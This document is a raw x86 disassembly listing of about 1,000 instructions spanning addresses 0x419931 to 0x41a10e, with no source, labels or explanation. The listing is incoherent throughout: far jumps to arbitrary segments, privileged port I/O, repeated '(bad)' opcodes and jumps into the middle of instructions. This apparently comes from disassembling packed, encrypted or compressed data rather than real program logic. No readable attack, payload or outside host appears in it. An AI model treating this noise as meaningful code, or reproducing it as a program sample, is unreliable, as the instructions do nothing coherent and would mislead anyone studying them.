  419931:	outs   dx,DWORD PTR ds:[esi]
  419932:	gs sti 
  419934:	or     ebx,esi
  419936:	cmp    eax,0xee037cb6
  41993b:	xor    al,0x6
  41993d:	mov    ebx,0x9cde0053
  419942:	fcmovb st,st(0)
  419944:	and    eax,0x9380db56
  419949:	dec    ecx
  41994a:	in     eax,dx
  41994b:	push   ss
  41994c:	iret   
  41994d:	mov    ds:0xd533438a,eax
  419952:	adc    ebp,ebp
  419954:	cld    
  419955:	push   ebp
  419956:	mov    eax,ds:0xae44a4d1
  41995b:	adc    al,0x64
  41995d:	popf   
  41995e:	jns    0x4198f5
  419960:	cmp    BYTE PTR [ecx],0xd7
  419963:	mov    eax,ds:0x9c336dae
  419968:	and    BYTE PTR [edi-0x47148f64],bl
  41996e:	pop    eax
  41996f:	pop    es
  419970:	jmp    0x3b35:0xaf8ab812
  419977:	bound  ecx,QWORD PTR [edx-0x53]
  41997a:	dec    eax
  41997b:	repnz pop es
  41997d:	or     ecx,ecx
  41997f:	pop    ebp
  419980:	ret    0x75dd
  419983:	mov    edx,DWORD PTR [eax+0x4]
  419986:	cmp    al,0xc0
  419988:	dec    esp
  419989:	fs jmp 0x419942
  41998c:	int3   
  41998d:	imul   ebx,DWORD PTR [ebp+0x1f8f0b4a],0x3c2220a2
  419997:	xchg   edi,eax
  419998:	jle    0x419a03
  41999a:	pop    es
  41999b:	pop    ebp
  41999c:	xchg   ebp,eax
  41999d:	bound  ebp,QWORD PTR [ebp-0x4f]
  4199a0:	mov    ds:0x2390c962,eax
  4199a5:	pop    eax
  4199a6:	dec    edi
  4199a7:	icebp  
  4199a8:	adc    cl,ch
  4199aa:	mov    eax,0x2064dd41
  4199af:	sub    eax,0xf407964c
  4199b4:	or     bh,BYTE PTR [edi+0x7c]
  4199b7:	fimul  DWORD PTR [esp+ebx*8-0x3370b70]
  4199be:	fadd   DWORD PTR [ebx-0x471282e4]
  4199c4:	sbb    BYTE PTR [ebp+edi*8-0x3642c063],al
  4199cb:	pop    edx
  4199cc:	xchg   dh,ah
  4199ce:	in     al,dx
  4199cf:	jo     0x419989
  4199d1:	adc    BYTE PTR es:[ecx+0x396d07f3],0x24
  4199d9:	xchg   BYTE PTR [edx-0x7d86c16b],bl
  4199df:	mov    dl,BYTE PTR [edx]
  4199e1:	in     al,0x7b
  4199e3:	mov    ebp,DWORD PTR [edx-0x4b]
  4199e6:	mov    BYTE PTR [esi],bh
  4199e8:	and    edx,edx
  4199ea:	mov    WORD PTR [esi+0x6025e849],ss
  4199f0:	cmp    BYTE PTR es:[edx],ah
  4199f3:	sub    al,0xbd
  4199f5:	leave  
  4199f6:	jo     0x4199f0
  4199f8:	jg     0x4199fb
  4199fa:	pop    esi
  4199fb:	fnstsw WORD PTR [eax-0x27]
  4199fe:	add    al,0xe2
  419a00:	mov    ah,0xb7
  419a02:	cmp    cl,BYTE PTR [ebp-0x791ff86f]
  419a08:	adc    ecx,DWORD PTR [ecx-0x2fad9e4e]
  419a0e:	loopne 0x419a0e
  419a10:	lds    esi,FWORD PTR [edx+0x50041acd]
  419a16:	neg    BYTE PTR [esi+0x84dd8ef]
  419a1c:	pop    edi
  419a1d:	mov    dh,BYTE PTR [ebx-0x6f]
  419a20:	fcom   QWORD PTR [edi+0x5239d550]
  419a26:	push   edi
  419a27:	push   esp
  419a28:	ins    BYTE PTR es:[edi],dx
  419a29:	push   ds
  419a2a:	or     al,0xec
  419a2c:	xchg   dl,al
  419a2e:	sub    eax,0x3968d509
  419a33:	jbe    0x4199e5
  419a35:	aaa    
  419a36:	mov    ecx,0x3fa9ddfc
  419a3b:	push   0x5a
  419a3d:	push   es
  419a3e:	rcr    DWORD PTR [ebx+ecx*8-0x78],1
  419a42:	pusha  
  419a43:	xacquire xchg DWORD PTR [ebp+eax*2+0x68],ecx
  419a48:	mov    ebp,0xbbe15ef2
  419a4d:	mov    eax,0x33f2517f
  419a52:	out    0xca,eax
  419a54:	movaps XMMWORD PTR [edi-0x4ca07773],xmm1
  419a5b:	or     eax,0x54ad4e00
  419a60:	mov    ?,WORD PTR [eax-0x10e71f37]
  419a66:	cld    
  419a67:	mov    edi,0x6761d0c3
  419a6c:	xchg   ecx,eax
  419a6d:	retf   0x8ca2
  419a70:	xchg   esp,eax
  419a71:	rcl    ecx,1
  419a73:	repz or al,0x4b
  419a76:	mov    BYTE PTR [ecx-0x7d9ac64a],bh
  419a7c:	sbb    eax,0xfd0b8308
  419a81:	ja     0x419afa
  419a83:	adc    BYTE PTR [ebp-0x7f32d77b],dl
  419a89:	adc    DWORD PTR [ebx-0x4544d99b],esi
  419a8f:	sbb    eax,0xc6390d89
  419a94:	mov    eax,0x61395a90
  419a99:	dec    edi
  419a9a:	add    BYTE PTR [edi],bl
  419a9c:	jns    0x419a73
  419a9e:	mov    eax,ds:0x5b077e8
  419aa3:	pop    edx
  419aa4:	mov    al,ds:0x9b14a250
  419aa9:	xchg   ebp,eax
  419aaa:	mov    cl,0xc8
  419aac:	fs add al,0x21
  419aaf:	and    esp,DWORD PTR [ebx+esi*8-0x36f58cb9]
  419ab6:	into   
  419ab7:	pop    ss
  419ab8:	iret   
  419ab9:	ret    0xfd4
  419abc:	test   al,0x66
  419abe:	mov    bl,0x54
  419ac0:	push   cs
  419ac1:	repnz or bh,BYTE PTR [ecx+0x68]
  419ac5:	aam    0xd2
  419ac7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ac8:	xchg   ebx,eax
  419ac9:	retf   0x8d7b
  419acc:	imul   edx,DWORD PTR [ecx-0x6781bde9],0xc64b1517
  419ad6:	fidivr DWORD PTR [eax]
  419ad8:	or     ebp,DWORD PTR [ecx-0xc567c26]
  419ade:	adc    ebx,DWORD PTR [ebx-0x46]
  419ae1:	add    eax,DWORD PTR [ecx+edi*1-0x4e]
  419ae5:	and    cl,bh
  419ae7:	xchg   ebx,eax
  419ae8:	cmp    DWORD PTR ds:0x21799a0,esi
  419aee:	xlat   BYTE PTR gs:[ebx]
  419af0:	(bad)
  419af4:	iret   
  419af5:	rcl    bl,0xb
  419af8:	inc    edx
  419af9:	stos   DWORD PTR es:[edi],eax
  419afa:	sbb    al,0x74
  419afc:	push   eax
  419afd:	mov    ecx,0xf0e42005
  419b02:	mov    ebp,esi
  419b04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b05:	idiv   BYTE PTR [ecx]
  419b07:	jp     0x419ac8
  419b09:	cmp    dh,BYTE PTR ds:0x5243e346
  419b0f:	ret    
  419b10:	into   
  419b11:	adc    DWORD PTR [esi+0xd5d1c39],edi
  419b17:	push   eax
  419b18:	mov    WORD PTR [ebp+ebx*4+0x3bdafed5],es
  419b1f:	call   0x9a73:0xbe22fde2
  419b26:	sub    eax,0xba0915f5
  419b2b:	mov    ds:0x4133830e,al
  419b30:	arpl   WORD PTR [edi-0x16c8caea],sp
  419b36:	and    al,0xca
  419b38:	mov    bh,BYTE PTR [esi+0x24945d00]
  419b3e:	pop    ebp
  419b3f:	dec    eax
  419b40:	sub    eax,0xb9c77f85
  419b45:	jp     0x419b06
  419b47:	mov    esi,0x1b613bac
  419b4c:	xchg   edx,eax
  419b4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b4e:	lds    edx,FWORD PTR [edx+0x47]
  419b51:	call   0xefea:0x995262fc
  419b58:	mov    ds:0x53c0193,eax
  419b5d:	jns    0x419b53
  419b5f:	dec    eax
  419b60:	pop    es
  419b61:	imul   BYTE PTR [edi-0x68906232]
  419b67:	cmp    BYTE PTR [ecx+eax*4],bh
  419b6a:	nop
  419b6b:	popa   
  419b6c:	repz dec eax
  419b6e:	xchg   esp,eax
  419b6f:	push   es
  419b70:	mov    ebx,0x52d07151
  419b75:	lods   al,BYTE PTR ds:[esi]
  419b76:	add    DWORD PTR [ecx+0x76],esi
  419b79:	jns    0x419b17
  419b7b:	(bad)  
  419b7c:	jne    0x419bf6
  419b7e:	or     ecx,DWORD PTR [ebp-0x42]
  419b81:	hlt    
  419b82:	adc    dl,dl
  419b84:	cmp    BYTE PTR [edi-0x4db5a040],dl
  419b8a:	pop    ds
  419b8b:	cwde   
  419b8c:	pop    ebp
  419b8d:	add    DWORD PTR [ecx],edx
  419b8f:	repnz in al,0xc0
  419b92:	mov    dh,0x1
  419b94:	cli    
  419b95:	push   cs
  419b96:	inc    esp
  419b97:	outs   dx,DWORD PTR ds:[esi]
  419b98:	jge    0x419bf5
  419b9a:	daa    
  419b9b:	dec    ecx
  419b9c:	out    0xd9,eax
  419b9e:	push   ebp
  419b9f:	stc    
  419ba0:	das    
  419ba1:	add    eax,ecx
  419ba3:	inc    esp
  419ba4:	(bad)  
  419ba5:	jno    0x419b73
  419ba7:	lea    ebp,[edx-0x26]
  419baa:	jl     0x419bfc
  419bac:	mov    eax,ds:0x86f37acb
  419bb1:	adc    al,0x79
  419bb3:	xor    ebp,DWORD PTR [esi-0x68a1de4e]
  419bb9:	rcr    DWORD PTR [edi+0x15],cl
  419bbc:	lods   eax,DWORD PTR ds:[esi]
  419bbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bbe:	gs add eax,0x33206e77
  419bc4:	or     eax,0xb1075a1e
  419bc9:	or     al,0x9d
  419bcb:	dec    ecx
  419bcc:	jp     0x419b8f
  419bce:	cmp    DWORD PTR [eax-0x25],0xcf6abefa
  419bd5:	mov    bl,0xc8
  419bd7:	cmp    esi,DWORD PTR [esi]
  419bd9:	mov    WORD PTR [esi+0x42293e42],es
  419bdf:	mov    cl,0xdf
  419be1:	jnp    0x419bae
  419be3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419be4:	add    bl,BYTE PTR [ebx+edx*8+0x46fe810d]
  419beb:	xchg   ebp,eax
  419bec:	iret   
  419bed:	mov    eax,esp
  419bef:	mov    ah,0x45
  419bf1:	loopne 0x419baa
  419bf3:	sar    ebp,cl
  419bf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bf6:	push   ecx
  419bf7:	std    
  419bf8:	out    dx,eax
  419bf9:	pop    ds
  419bfa:	sbb    eax,0xf4c3c8
  419bff:	imul   DWORD PTR [ecx-0x352bb88]
  419c05:	push   ecx
  419c06:	sub    eax,0x394e018b
  419c0b:	call   FWORD PTR [eax+0x3d]
  419c0e:	ja     0x419bf3
  419c10:	sbb    DWORD PTR [eax-0x22599df2],ebp
  419c16:	aam    0x51
  419c18:	fmul   QWORD PTR [esi+eiz*2+0x47]
  419c1c:	and    ah,dl
  419c1e:	mov    BYTE PTR [edx+0x2ff3381],0x34
  419c25:	cmp    DWORD PTR [eax-0x57],ebx
  419c28:	sub    DWORD PTR [edi],0x6b64d07f
  419c2e:	popf   
  419c2f:	jb     0x419c27
  419c31:	jbe    0x419c95
  419c33:	es mov dl,0xfd
  419c36:	push   DWORD PTR [edx+0x7a]
  419c39:	push   eax
  419c3a:	sbb    al,0x89
  419c3c:	pusha  
  419c3d:	retf   
  419c3e:	sub    eax,0x180366de
  419c43:	pop    es
  419c44:	jp     0x419c34
  419c46:	dec    edi
  419c47:	jecxz  0x419cb8
  419c49:	(bad)  
  419c4a:	neg    BYTE PTR [edi]
  419c4c:	or     ch,BYTE PTR es:[eax+0x4a5553f8]
  419c53:	push   es
  419c54:	bnd jne 0x419c30
  419c57:	pop    bp
  419c59:	dec    esi
  419c5a:	js     0xd2edb36d
  419c60:	loop   0x419c4b
  419c62:	mov    ds:0x12b2f25e,al
  419c67:	daa    
  419c68:	lock fcom QWORD PTR [eax]
  419c6b:	out    dx,eax
  419c6c:	sti    
  419c6d:	push   ecx
  419c6e:	pop    es
  419c6f:	mul    edx
  419c71:	loopne 0x419cc4
  419c73:	xor    eax,0x1e552aef
  419c78:	inc    edx
  419c79:	and    DWORD PTR [ebp+0x10],edi
  419c7c:	out    0xe9,al
  419c7e:	imul   eax,ecx,0xffffffd1
  419c81:	cdq    
  419c82:	clc    
  419c83:	rcr    DWORD PTR [edi+0x8],cl
  419c86:	cmp    BYTE PTR [edx-0x12706ae0],dl
  419c8c:	loopne 0x419c29
  419c8e:	pop    esi
  419c8f:	icebp  
  419c90:	xlat   BYTE PTR ds:[ebx]
  419c91:	mov    bl,0xa5
  419c93:	imul   ebx,DWORD PTR [esi+0x71dd18c6],0x55
  419c9a:	retf   
  419c9b:	stos   DWORD PTR es:[edi],eax
  419c9c:	fisubr DWORD PTR [ebp+0x3215a0d5]
  419ca2:	sti    
  419ca3:	sub    eax,0xb134eb9f
  419ca8:	xchg   ecx,eax
  419ca9:	retf   
  419caa:	pop    esi
  419cab:	push   eax
  419cac:	aaa    
  419cad:	dec    ecx
  419cae:	or     DWORD PTR [ebx+0x68b09224],0x0
  419cb5:	in     eax,dx
  419cb6:	xchg   esi,eax
  419cb7:	stc    
  419cb8:	loop   0x419c55
  419cba:	ret    0xf759
  419cbd:	retf   
  419cbe:	mov    ds:0x3afb5dfd,eax
  419cc3:	fdivr  st,st(4)
  419cc5:	and    DWORD PTR [edx-0x4d],eax
  419cc8:	xor    al,0xf3
  419ccb:	and    ebx,DWORD PTR [ebp+0x361bac4c]
  419cd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cd2:	add    eax,0x45a2a401
  419cd7:	test   eax,0x2c1875e8
  419cdc:	push   edi
  419cdd:	mov    ds:0x54b04efe,eax
  419ce2:	dec    eax
  419ce3:	xchg   ebp,eax
  419ce4:	mov    ds:0xdcf2e67c,eax
  419ce9:	in     al,dx
  419cea:	dec    esi
  419ceb:	xchg   ecx,eax
  419cec:	jg     0x419cb3
  419cee:	or     al,0x1
  419cf0:	js     0x419cee
  419cf2:	fild   WORD PTR [esi]
  419cf4:	sbb    eax,0xe34a76f2
  419cf9:	dec    ebp
  419cfa:	enter  0xa765,0x5d
  419cfe:	pop    ecx
  419cff:	sahf   
  419d00:	pop    ebx
  419d01:	mov    al,0xbb
  419d03:	cmp    BYTE PTR [ebp+0x5b],al
  419d06:	sbb    ch,cl
  419d08:	lahf   
  419d09:	mov    al,0x22
  419d0b:	cmp    edi,DWORD PTR [esi]
  419d0d:	cwde   
  419d0e:	clc    
  419d0f:	imul   esp,DWORD PTR [esp+ebx*4-0x42],0x4d
  419d14:	pop    edx
  419d15:	sbb    eax,DWORD PTR [edi]
  419d17:	(bad)  
  419d18:	and    ecx,ebp
  419d1a:	mov    bh,0xc3
  419d1c:	retf   0x2f11
  419d1f:	push   ds
  419d20:	pop    eax
  419d21:	scas   eax,DWORD PTR es:[edi]
  419d22:	jmp    0x18b4:0x16cf0178
  419d29:	cli    
  419d2a:	lahf   
  419d2b:	imul   esp,DWORD PTR ds:0x890c923d,0xd357ba50
  419d35:	dec    eax
  419d36:	jae    0x419ccc
  419d38:	and    eax,0xfc89d169
  419d3d:	mov    ebx,0x2a3961f8
  419d42:	test   al,0xfe
  419d44:	or     al,0x1a
  419d46:	mov    ebp,0xfda465d5
  419d4b:	dec    eax
  419d4c:	add    eax,0xf0938f10
  419d51:	aad    0x78
  419d53:	icebp  
  419d54:	mov    edi,0x76d76b3a
  419d59:	add    ebx,ecx
  419d5b:	sub    DWORD PTR [edi-0xe25dada],esp
  419d61:	dec    edi
  419d62:	leave  
  419d63:	cmp    BYTE PTR [esi],dh
  419d65:	syscall 
  419d67:	rcl    ah,cl
  419d69:	imul   edi,DWORD PTR [ebp+edx*8-0x43eb1d37],0xb0474092
  419d74:	das    
  419d75:	ret    
  419d76:	sar    DWORD PTR [ecx+0x782296d2],0x98
  419d7d:	lods   al,BYTE PTR ds:[esi]
  419d7e:	fmul   DWORD PTR [eax+0x2a]
  419d81:	ret    0x1e43
  419d84:	cmp    eax,0x2e8077d5
  419d89:	inc    ecx
  419d8a:	retf   0xa52e
  419d8d:	pop    edi
  419d8e:	(bad)  
  419d8f:	(bad)  
  419d91:	jmp    0x805c:0x2e8ff56f
  419d98:	and    DWORD PTR [edi+eiz*8+0x26fd147a],0x57
  419da0:	inc    edi
  419da1:	inc    ecx
  419da2:	jmp    0xb226b7ed
  419da7:	lods   eax,DWORD PTR ds:[esi]
  419da8:	js     0x419d54
  419daa:	dec    esp
  419dab:	cmp    bl,BYTE PTR [esi-0x42]
  419dae:	xchg   ecx,eax
  419daf:	dec    ebp
  419db0:	addr16 cdq 
  419db2:	loope  0x419d89
  419db4:	loopne 0x419de5
  419db6:	sub    dl,0x12
  419db9:	jge    0x419d87
  419dbb:	iret   
  419dbc:	not    DWORD PTR [ecx-0x1c]
  419dbf:	dec    ebp
  419dc0:	(bad)  
  419dc1:	add    si,cx
  419dc4:	push   ds
  419dc5:	push   es
  419dc6:	stos   BYTE PTR es:[edi],al
  419dc7:	cmp    al,0x98
  419dc9:	in     eax,dx
  419dca:	jmp    0x419e19
  419dcc:	sbb    bh,BYTE PTR [ebx+0x5cf7c712]
  419dd2:	push   edi
  419dd3:	data16 jl 0x419dc6
  419dd6:	fild   DWORD PTR [edx-0x53]
  419dd9:	fisubr WORD PTR [ebp+eiz*1-0x16310fef]
  419de0:	cmp    DWORD PTR [ebx-0x4338d2d],edi
  419de6:	iret   
  419de7:	aam    0x5d
  419de9:	je     0x419e69
  419deb:	fcmovb st,st(6)
  419ded:	cmp    DWORD PTR [ecx],0x13
  419df0:	inc    esi
  419df1:	(bad)  [edx]
  419df3:	mov    bl,0x90
  419df5:	pop    edi
  419df6:	loopne 0x419e0a
  419df8:	ja     0x419e1a
  419dfa:	push   0xe5c1a8a6
  419dff:	daa    
  419e00:	adc    edi,0x63
  419e03:	pop    ebp
  419e04:	lods   al,BYTE PTR ds:[esi]
  419e05:	stos   BYTE PTR es:[edi],al
  419e06:	push   edi
  419e07:	daa    
  419e08:	call   0x9126c454
  419e0d:	sub    eax,DWORD PTR [ebx+esi*8]
  419e10:	cmc    
  419e11:	test   BYTE PTR [ebx],0x34
  419e14:	scas   eax,DWORD PTR es:[edi]
  419e15:	cmp    BYTE PTR [edi-0x6ff15a8b],bh
  419e1b:	out    0x84,al
  419e1d:	pop    eax
  419e1e:	mov    edi,0xe234ed0d
  419e23:	xor    dl,bh
  419e25:	jmp    0x71bd3d17
  419e2a:	mov    al,BYTE PTR [edx]
  419e2c:	jle    0x419e34
  419e2e:	aad    0x5c
  419e30:	lods   eax,DWORD PTR ds:[esi]
  419e31:	pop    edx
  419e32:	inc    eax
  419e33:	sahf   
  419e34:	fcomp  QWORD PTR [edx+0x43]
  419e37:	jnp    0x419dbf
  419e39:	ins    BYTE PTR es:[edi],dx
  419e3a:	or     BYTE PTR [edi+0x136e912],dl
  419e40:	jo     0x419eac
  419e42:	cdq    
  419e43:	xor    BYTE PTR [eax+0x620a74b9],cl
  419e49:	sbb    bh,BYTE PTR [edx+0x7a]
  419e4c:	nop
  419e4d:	sbb    BYTE PTR [esi],0x79
  419e50:	xchg   edx,eax
  419e51:	xor    DWORD PTR [esi],ebx
  419e53:	loop   0x419e2f
  419e55:	and    al,0xfa
  419e57:	inc    ecx
  419e58:	out    0x33,al
  419e5a:	cs jge 0x419ea6
  419e5d:	pop    edi
  419e5e:	or     BYTE PTR [eax],bh
  419e60:	es mov ah,0xcd
  419e63:	dec    eax
  419e64:	out    0xa9,al
  419e66:	jnp    0x419eb9
  419e68:	mov    ebp,0xcfaff525
  419e6d:	mov    edi,0x9fc9c965
  419e72:	retf   0xfca6
  419e75:	es pop edi
  419e77:	and    edi,edi
  419e79:	mov    edx,0x2dfed206
  419e7e:	cmp    eax,0xb9490cbd
  419e83:	pop    edi
  419e84:	pop    edx
  419e85:	dec    esp
  419e86:	add    DWORD PTR [eax-0x3a],ebp
  419e89:	pop    edx
  419e8a:	out    0xce,eax
  419e8c:	sbb    dl,BYTE PTR [esi+eiz*8+0x20]
  419e90:	inc    ecx
  419e91:	pushw  es
  419e93:	fsub   QWORD PTR [eax+0xc]
  419e96:	stos   BYTE PTR es:[edi],al
  419e97:	std    
  419e98:	pop    esp
  419e99:	sub    ebx,DWORD PTR [edi-0x52]
  419e9c:	in     al,0x77
  419e9e:	and    DWORD PTR [esi],ecx
  419ea0:	mov    ds:0x369cde1,al
  419ea5:	mov    esi,fs
  419ea7:	pop    edi
  419ea8:	(bad)
  419eac:	je     0x419f2c
  419eae:	daa    
  419eaf:	call   0xce6b:0xa10b7d24
  419eb6:	shl    BYTE PTR [ebx-0x41],cl
  419eb9:	arpl   WORD PTR [edx+0x55],dx
  419ebc:	(bad)  
  419ebd:	xchg   esp,eax
  419ebe:	mov    ah,0x45
  419ec0:	mov    ah,0x61
  419ec2:	scas   al,BYTE PTR es:[edi]
  419ec3:	(bad)  
  419ec4:	jae    0x419f32
  419ec6:	repnz mov dl,0x53
  419ec9:	leave  
  419eca:	adc    al,0x6a
  419ecc:	out    dx,eax
  419ecd:	and    DWORD PTR [eax],edi
  419ecf:	ret    0x6236
  419ed2:	aad    0xd5
  419ed4:	sbb    bh,al
  419ed6:	outs   dx,BYTE PTR ds:[esi]
  419ed7:	push   edi
  419ed8:	or     DWORD PTR [edi-0x77],esi
  419edb:	xchg   ebp,eax
  419edc:	leave  
  419edd:	and    edx,DWORD PTR [ecx-0x58]
  419ee0:	les    eax,FWORD PTR [ecx]
  419ee2:	in     eax,0x64
  419ee4:	cdq    
  419ee5:	xchg   ecx,eax
  419ee6:	adc    BYTE PTR [eax+0x6d],cl
  419ee9:	leave  
  419eea:	sub    al,0x83
  419eec:	pusha  
  419eed:	xchg   BYTE PTR [edx+0x6c],dl
  419ef0:	sub    eax,0x43dff54e
  419ef5:	test   al,0x2c
  419ef7:	push   esi
  419ef8:	sub    al,0xfc
  419efa:	data16 scas al,BYTE PTR es:[edi]
  419efc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419efd:	mov    ebp,0x50e3116e
  419f02:	les    eax,FWORD PTR [edi+0x6ca2a672]
  419f08:	or     al,0x48
  419f0a:	retf   0xa13b
  419f0d:	aad    0xd3
  419f0f:	sub    cl,bh
  419f11:	inc    edi
  419f12:	push   ebp
  419f13:	fxch   st(1)
  419f15:	inc    ecx
  419f16:	hlt    
  419f17:	add    DWORD PTR [ecx+0x4a07a051],0x34b66f20
  419f21:	mov    eax,ds:0x2e2617ce
  419f26:	dec    eax
  419f27:	dec    edx
  419f28:	out    0x61,al
  419f2a:	lods   eax,DWORD PTR ds:[esi]
  419f2b:	fs pop esi
  419f2d:	or     bh,BYTE PTR [ebp+0x8]
  419f30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f31:	dec    ecx
  419f32:	push   esp
  419f33:	in     al,0xc5
  419f35:	leave  
  419f36:	pop    edi
  419f37:	jmp    0x35d56a70
  419f3c:	add    eax,0xf1e5d952
  419f41:	push   ecx
  419f42:	loopne 0x419f3c
  419f44:	jp     0x419fbd
  419f46:	test   DWORD PTR [edi-0x44d84aa0],eax
  419f4c:	iret   
  419f4d:	stos   DWORD PTR es:[edi],eax
  419f4e:	or     eax,0x3a8c582
  419f53:	xor    DWORD PTR [edx],0xc598de9f
  419f59:	jmp    0x419f98
  419f5b:	adc    esp,ebx
  419f5d:	jmp    0xbcaa:0xae842272
  419f64:	int3   
  419f65:	or     BYTE PTR [ebx-0x5d],ch
  419f68:	lahf   
  419f69:	ja     0x419fc4
  419f6b:	scas   eax,DWORD PTR es:[edi]
  419f6c:	dec    ebx
  419f6d:	mov    esi,0xb32c6b0f
  419f72:	mov    dl,0x54
  419f74:	pushf  
  419f75:	out    dx,eax
  419f76:	or     BYTE PTR [ecx+0x48e46938],ah
  419f7c:	repz adc BYTE PTR [edi],dl
  419f7f:	sbb    ch,BYTE PTR [ecx]
  419f81:	xchg   ebp,eax
  419f82:	adc    bh,al
  419f84:	push   ebp
  419f85:	fdiv   st(0),st
  419f87:	xor    BYTE PTR [ebx-0x30fe9505],ah
  419f8d:	push   0xea39372c
  419f92:	or     BYTE PTR [esi+0x38c123c],0xa0
  419f99:	sbb    al,0x1f
  419f9b:	pop    ds
  419f9c:	sub    eax,0x7e5c08f1
  419fa1:	lds    edi,FWORD PTR [edi]
  419fa3:	mov    esp,edx
  419fa5:	fistp  DWORD PTR [esp+ebx*4+0x5b]
  419fa9:	add    DWORD PTR [edx-0x4c8652b3],edx
  419faf:	sub    eax,0xe6209569
  419fb4:	push   0x4c4e6ff2
  419fb9:	sbb    al,0xa6
  419fbb:	push   ebx
  419fbc:	pop    esi
  419fbd:	scas   al,BYTE PTR es:[edi]
  419fbe:	lea    esp,[eax+0x28]
  419fc1:	inc    esi
  419fc2:	in     eax,0x71
  419fc4:	jbe    0x41a01c
  419fc6:	push   esi
  419fc7:	xchg   DWORD PTR [eax-0x6b4cc6ea],ebp
  419fcd:	out    dx,eax
  419fce:	cli    
  419fcf:	mov    bh,0x12
  419fd1:	push   edx
  419fd2:	mov    WORD PTR [ecx],fs
  419fd4:	out    dx,eax
  419fd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419fd6:	mov    eax,0x7cd0abc2
  419fdb:	xor    eax,ebx
  419fdd:	sbb    esp,DWORD PTR [edx]
  419fdf:	xor    BYTE PTR [edx+edx*8-0x3844fa4c],dh
  419fe6:	mov    ah,ch
  419fe8:	adc    eax,0xa532a542
  419fed:	je     0x419ffc
  419fef:	xor    al,0x14
  419ff1:	push   edi
  419ff2:	sbb    eax,0xe8bf738e
  419ff7:	cdq    
  419ff8:	xchg   edi,eax
  419ff9:	retf   
  419ffa:	jmp    0x3760ad7c
  419fff:	xchg   al,bl
  41a001:	fild   DWORD PTR [ecx]
  41a003:	repz sahf 
  41a005:	cmc    
  41a006:	dec    esp
  41a007:	stc    
  41a008:	ret    0xd457
  41a00b:	and    ch,dl
  41a00d:	nop
  41a00e:	and    BYTE PTR [edx-0x1056f012],bh
  41a014:	inc    esp
  41a015:	(bad)  
  41a016:	aad    0x1a
  41a018:	in     al,0x76
  41a01a:	dec    edi
  41a01b:	jne    0x41a053
  41a01d:	cmp    BYTE PTR [edi],bh
  41a01f:	cmp    ebx,esp
  41a021:	add    eax,0x1a7f3a69
  41a026:	pop    ss
  41a027:	mov    ebx,0x3c121bcb
  41a02c:	loopne 0x41a05b
  41a02e:	out    dx,eax
  41a02f:	dec    esi
  41a030:	sub    eax,0x5e19fd0a
  41a035:	mov    es,WORD PTR [edi-0x4c]
  41a038:	push   edi
  41a039:	cli    
  41a03a:	and    eax,0xdc48310a
  41a03f:	pop    ds
  41a040:	das    
  41a041:	call   0x774:0xcfccbbd2
  41a048:	stos   DWORD PTR es:[edi],eax
  41a049:	fcmovnb st,st(0)
  41a04b:	dec    edx
  41a04c:	inc    edi
  41a04d:	js     0x41a0ab
  41a04f:	sbb    ebx,DWORD PTR gs:[ecx+0x7808739f]
  41a056:	rcl    DWORD PTR [edx+0xb135e7a],cl
  41a05c:	xor    eax,0xbaa4e69d
  41a061:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a062:	xor    DWORD PTR [ecx],0xffffffd1
  41a065:	adc    dl,BYTE PTR [eax-0x3c]
  41a068:	lahf   
  41a069:	(bad)  
  41a06a:	jne    0x41a07a
  41a06c:	or     edx,DWORD PTR [ecx]
  41a06e:	adc    edx,DWORD PTR [esi+0x36a5ecaa]
  41a074:	mov    dl,0x88
  41a076:	out    dx,eax
  41a077:	in     eax,dx
  41a078:	adc    BYTE PTR [ebx],dl
  41a07a:	pop    edi
  41a07b:	push   edx
  41a07c:	mov    ch,0x96
  41a07f:	xchg   ecx,eax
  41a080:	xchg   DWORD PTR [esi],edi
  41a082:	xor    bl,BYTE PTR [esi+0x7d]
  41a085:	ret    
  41a086:	lock rol esi,1
  41a089:	inc    esp
  41a08a:	stc    
  41a08b:	cmp    al,0x55
  41a08d:	mov    cl,0x3
  41a08f:	cmp    BYTE PTR [eax-0x7f18b5ec],bh
  41a095:	fadd   QWORD PTR [esi+0x7eaf4bad]
  41a09b:	jmp    0xa5a6:0xbaab5dc3
  41a0a2:	xchg   ebx,eax
  41a0a3:	sub    DWORD PTR [edx],esi
  41a0a5:	repnz adc DWORD PTR [eax-0x18e61c13],esi
  41a0ac:	js     0x41a07d
  41a0ae:	cwde   
  41a0af:	out    0xaf,al
  41a0b1:	daa    
  41a0b2:	hlt    
  41a0b3:	xchg   ecx,eax
  41a0b4:	retf   0x15e5
  41a0b7:	mov    dh,0xba
  41a0b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0ba:	jmp    0x34cc063e
  41a0bf:	add    DWORD PTR [edx+0xc],esi
  41a0c2:	xor    BYTE PTR [eax+ebp*1],dl
  41a0c5:	pop    es
  41a0c6:	dec    eax
  41a0c7:	(bad)  [edi-0x3b]
  41a0ca:	outs   dx,BYTE PTR ds:[esi]
  41a0cb:	test   DWORD PTR [edi+0x7c],0x2d515ce1
  41a0d2:	call   FWORD PTR [ebx+ecx*8-0x7f815378]
  41a0d9:	jb     0x41a0ff
  41a0db:	clc    
  41a0dc:	stos   DWORD PTR es:[edi],eax
  41a0dd:	fadd   DWORD PTR [ebx-0x33]
  41a0e0:	fldenv [edi+0x23]
  41a0e3:	pop    es
  41a0e4:	cs pop edx
  41a0e6:	(bad)  
  41a0e7:	or     eax,0xee2f9312
  41a0ec:	repz dec edi
  41a0ee:	jge    0x41a0b7
  41a0f0:	xor    eax,0x8daac825
  41a0f5:	inc    esi
  41a0f6:	(bad)  
  41a0f7:	in     al,dx
  41a0f8:	add    dl,BYTE PTR [edx-0x4ca5c8c9]
  41a0fe:	(bad)  
  41a0ff:	gs add dh,dh
  41a102:	daa    
  41a103:	sbb    DWORD PTR [edx],esi
  41a105:	retf   0xd87e
  41a108:	mov    edi,0xdd4e7955
  41a10d:	int3   
  41a10e:	stos   DWORD PTR es:[edi],eax
